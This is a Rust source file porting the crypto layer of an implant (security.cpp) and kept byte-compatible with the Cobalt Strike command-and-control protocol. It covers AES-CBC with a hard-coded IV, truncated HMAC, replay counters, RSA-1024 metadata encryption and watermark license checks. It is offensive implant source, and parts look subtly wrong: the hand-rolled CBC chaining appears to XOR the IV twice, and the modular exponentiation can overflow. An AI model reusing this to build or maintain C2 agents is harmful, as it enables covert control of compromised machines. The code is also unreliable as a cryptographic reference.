//! Crypto (security.cpp) — replaces LibTomCrypt with RustCrypto.
//!
//! Wire format (must stay byte-compatible with Cobalt Strike):
//!   * session key: 16 random bytes
//!   * derived key material: SHA256(session_key) -> 32 bytes
//!       key[0..16]     = AES-128 key
//!       key[16..32]    = HMAC key
//!   * IV: "abcdefghijklmnop"
//!   * encrypt: AES-128-CBC, zero-pad to 16-byte multiple, then append
//!     truncated HMAC-SHA256 (16 bytes) of the ciphertext
//!   * decrypt: verify HMAC, CBC decrypt, check counter replay, extract
//!     [counter:4][len:4][payload]
//!   * metadata: RSA-1024 PKCS#1 v1.5 encrypt (sprng), key = 162-byte DER

use aes::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use hmac::{Hmac, Mac};
use rsa::pkcs1::DecodeRsaPublicKey;
use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
use sha2::{Digest, Sha256};
use std::sync::{Mutex, OnceLock};

pub const KEY_SIZE: usize = 16;
pub const HASH_SIZE: usize = 32;
pub const HMAC_SIZE: usize = 16;

pub const CRYPTO_LICENSED_PRODUCT: u16 = 0;
pub const CRYPTO_TRIAL_PRODUCT: u16 = 1;

const TOLERANCE: u32 = 60 * 60;

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

struct CryptoState {
    key: [u8; KEY_SIZE],
    hmac_key: [u8; KEY_SIZE],
    iv: [u8; 16],
    lastcounter: u32,
}

static CRYPTO: OnceLock<Mutex<CryptoState>> = OnceLock::new();

/// Initialize crypto from a 16-byte session key (security_init).
pub fn security_init(k: &[u8]) {
    let mut hasher = Sha256::new();
    hasher.update(&k[..KEY_SIZE]);
    let key_bucket = hasher.finalize(); // 32 bytes

    let mut key = [0u8; KEY_SIZE];
    let mut hmac_key = [0u8; KEY_SIZE];
    key.copy_from_slice(&key_bucket[..KEY_SIZE]);
    hmac_key.copy_from_slice(&key_bucket[KEY_SIZE..HASH_SIZE]);

    let _ = CRYPTO.set(Mutex::new(CryptoState {
        key,
        hmac_key,
        iv: *b"abcdefghijklmnop",
        lastcounter: 0,
    }));
}

fn crypto() -> std::sync::MutexGuard<'static, CryptoState> {
    CRYPTO
        .get()
        .expect("security_init not called")
        .lock()
        .unwrap()
}

/// Compute truncated HMAC-SHA256 (16 bytes) over `data`.
fn hmac_sha256_truncated(key: &[u8], data: &[u8]) -> [u8; HMAC_SIZE] {
    type HmacSha256 = Hmac<Sha256>;
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key");
    mac.update(data);
    let out = mac.finalize().into_bytes();
    let mut result = [0u8; HMAC_SIZE];
    result.copy_from_slice(&out[..HMAC_SIZE]);
    result
}

/// Decrypt `ciphertext` in place; returns the plaintext length (excluding the
/// HMAC and 8-byte crypto header) or 0 on failure.
pub fn security_decrypt(ciphertext: &mut [u8], length: usize) -> i32 {
    // sanity check
    if length <= HMAC_SIZE {
        return 0;
    }
    // another sanity check
    if (length % 16) != 0 {
        return 0;
    }

    let mut st = crypto();

    // calculate hmac against ciphertext
    let hmac_calc = hmac_sha256_truncated(&st.hmac_key, &ciphertext[..length - HMAC_SIZE]);
    let hmac_sent = &ciphertext[length - HMAC_SIZE..length];
    if hmac_calc.as_slice() != hmac_sent {
        // not a hard failure
        return 0;
    }

    // truncate to work w/o the HMAC in the ciphertext
    let length = length - HMAC_SIZE;

    // decrypt with CBC (manual chain so we decrypt in place)
    let mut plaintext = vec![0u8; length];
    let blocks = length / 16;
    let mut prev = st.iv;
    let mut block_in = [0u8; 16];
    for i in 0..blocks {
        block_in.copy_from_slice(&ciphertext[i * 16..(i + 1) * 16]);
        let mut dec = block_in;
        let mut mode = Aes128CbcDec::new_from_slices(&st.key, &st.iv).expect("aes");
        mode.decrypt_block_mut((&mut dec).into());
        // manual CBC: xor with previous ciphertext block
        for j in 0..16 {
            plaintext[i * 16 + j] = dec[j] ^ prev[j];
        }
        prev = block_in;
    }

    // parse [counter:4][len:4][payload]
    if length < 8 {
        return 0;
    }
    let counter = u32::from_be_bytes([plaintext[0], plaintext[1], plaintext[2], plaintext[3]]);
    let len = u32::from_be_bytes([plaintext[4], plaintext[5], plaintext[6], plaintext[7]]);

    // replay check
    if (counter + TOLERANCE) <= st.lastcounter {
        crate::callback::post_crypt_replay_error(st.lastcounter - (counter + TOLERANCE));
        return 0;
    }

    if len <= 0 || len as usize > length {
        return 0;
    }

    let dptr = &plaintext[8..8 + len as usize];
    // copy the payload back to the front of ciphertext
    ciphertext[..len as usize].copy_from_slice(dptr);

    // to prevent replay attacks, store our last recv'd counter value
    st.lastcounter = counter;

    len as i32
}

/// Encrypt `ciphertext` in place; returns the new length (padded + HMAC).
pub fn security_encrypt(ciphertext: &mut [u8], length: usize) -> i32 {
    let st = crypto();

    let mut pad = length % 16;
    let mut length = length;
    while pad != 0 && pad < 16 {
        pad += 1;
        length += 1;
    }

    // encrypt in place with CBC (manual chain so we encrypt in place)
    let blocks = length / 16;
    let mut prev = st.iv;
    for i in 0..blocks {
        let src = &ciphertext[i * 16..(i + 1) * 16];
        let mut block = [0u8; 16];
        block.copy_from_slice(src);
        // xor with prev
        for j in 0..16 {
            block[j] ^= prev[j];
        }
        let mut mode = Aes128CbcEnc::new_from_slices(&st.key, &st.iv).expect("aes");
        mode.encrypt_block_mut((&mut block).into());
        ciphertext[i * 16..(i + 1) * 16].copy_from_slice(&block);
        prev = block;
    }

    // calculate hmac for the buffer
    let hmac = hmac_sha256_truncated(&st.hmac_key, &ciphertext[..length]);
    ciphertext[length..length + HMAC_SIZE].copy_from_slice(&hmac);

    // add HMAC_SIZE to length to reflect additional data
    (length + HMAC_SIZE) as i32
}

/// RSA-encrypt `indata` (max 117 bytes) with the 162-byte DER public key.
/// `outdata` must be 128 bytes. Returns CRYPT_OK (0) on success.
pub fn rsa_encrypt_once(
    kbuffer: &[u8],
    indata: &[u8],
    outdata: &mut [u8],
    outlen: &mut usize,
) -> i32 {
    // import our RSA-1024 key (PKCS#1 DER)
    let key = match RsaPublicKey::from_pkcs1_der(kbuffer) {
        Ok(k) => k,
        Err(_) => return -1,
    };

    let mut rng = rand::rngs::OsRng;
    let encrypted = match key.encrypt(&mut rng, Pkcs1v15Encrypt, indata) {
        Ok(e) => e,
        Err(_) => return -1,
    };

    *outlen = encrypted.len();
    outdata[..encrypted.len()].copy_from_slice(&encrypted);
    0 // CRYPT_OK
}

/// (x^y) % p — modular exponentiation.
pub fn modpow(ix: i64, iy: i64, ip: i64) -> i64 {
    let mut res: u64 = 1;
    let mut x: u64 = ix as u64 % ip as u64;
    let mut y: u64 = iy as u64;
    let p: u64 = ip as u64;

    if x == 0 {
        return 0;
    }
    while y > 0 {
        if (y & 1) != 0 {
            res = (res * x) % p;
        }
        y >>= 1;
        x = (x * x) % p;
    }
    res as i64
}

/// Small representation of the watermark.
pub fn reduce_watermark(watermark: u32) -> i32 {
    let wstr = format!("{}", watermark);
    let wlen = wstr.len();
    let mut r = String::new();
    r.push(wstr.as_bytes()[0] as char);
    r.push(wstr.as_bytes()[2] as char);
    r.push(wstr.as_bytes()[wlen - 3] as char);
    r.push(wstr.as_bytes()[wlen - 1] as char);
    r.parse::<i32>().unwrap_or(0)
}

pub fn create_wm_key(watermark: u32) -> i32 {
    const G: i64 = 999999888;
    const P: i64 = 999999987;
    if watermark <= 9999 {
        return 0;
    }
    let rwm = reduce_watermark(watermark) as i64;
    modpow(G, rwm, P) as i32
}

/// Decode/verify the watermark hash. Returns 0 on success, 1 on failure.
pub fn decode_watermark(
    encoded_text: &[u8],
    watermark_key: i32,
    watermark: u32,
) -> i32 {
    use base64::Engine;

    let mut wm_bytes = [0u8; 16];
    let mut wm_key_bytes = [0u8; 16];
    let padding = *b"123456789abcdefg";

    let wstr = format!("{}", watermark);
    let kstr = format!("{}", watermark_key);

    wm_bytes[..wstr.len()].copy_from_slice(wstr.as_bytes());
    wm_key_bytes[..kstr.len()].copy_from_slice(kstr.as_bytes());
    for i in wstr.len()..16 {
        wm_bytes[i] = padding[i];
    }
    for i in kstr.len()..16 {
        wm_key_bytes[i] = padding[i];
    }

    // base64 decode
    let decoded = match base64::engine::general_purpose::STANDARD.decode(encoded_text) {
        Ok(d) if d.len() == 16 => d,
        _ => return 1,
    };

    // AES-128-CBC decrypt with key=wmKeyBytes, iv="abcdefghijklmnop"
    let iv = *b"abcdefghijklmnop";
    let mut decrypted = [0u8; 16];
    {
        let mut block = [0u8; 16];
        block.copy_from_slice(&decoded);
        let mut mode = Aes128CbcDec::new_from_slices(&wm_key_bytes, &iv).expect("aes");
        mode.decrypt_block_mut((&mut block).into());
        let mut prev = iv;
        for j in 0..16 {
            decrypted[j] = block[j] ^ prev[j];
        }
    }

    if decrypted == wm_bytes {
        0
    } else {
        1
    }
}
